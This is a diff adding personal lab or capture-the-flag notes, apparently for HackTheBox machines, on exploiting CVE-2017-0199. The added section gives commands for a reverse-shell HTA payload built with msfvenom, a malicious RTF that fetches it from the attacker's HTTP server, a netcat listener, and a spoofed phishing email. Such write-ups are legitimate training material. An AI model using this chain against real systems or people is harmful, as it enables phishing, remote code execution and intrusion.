@@ -6,6 +6,7 @@ privileges in an Active Directory environment.
 FTP Enum + wget Files
 exiftool for docx Files
 SMTP Enumeration
+RTF RCE Exploit
 #########
 Resolute:
 
@@ -76,7 +77,29 @@ Resolute:
 
     In one txt note 'nico@megabank.com' has specified that he want o receive files in RTF format by email
 
-                
-              
+
+2-Exploit of SMTP port 25 via RCE in RTF Format:
+    We'll use RTF exploit and simulate a phshing attak:
+        -https://github.com/bhdresh/CVE-2017-0199
+        The script will send a malicious payload for a reverse shell via rtf file through an email sent to nico@megbank.com 
+
+    First we’ll need to create a reverse shell HTA file:
+        └─$ msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP> LPORT=4443 -f hta-psh -o shell.hta
+
+    Next we can use the GitHub exploit to generate a RTF file as mentioned in the readme.txt file:
+
+        └─$ python2 cve-2017-0199_toolkit.py -M gen -t RTF -w click_me.rtf -u http://<Kali IP>/shell.hta -x 0
+        Generating normal RTF payload.
+
+    Finally lets set up both a Python HTTP server as well as a NetCat listener, and attempt to send the malicious email with:
+        python3 -m http.server 
+        nc -lvnp 4443
+
+        sendEmail -t nico@megabank.com -f support@megabank.com -u "Microsof - Update - RCE CVE exploit" -m "Click on the link to verify the versions impackted" -a click_me.rtf -s 10.10.10.77
+
+    For the escalation of priviliges we'll add some user to some domain in order to get access at some backup files and get Admin passwd:
+        https://www.youtube.com/watch?v=ob9SgtFm6_g
+
+                    
 
 
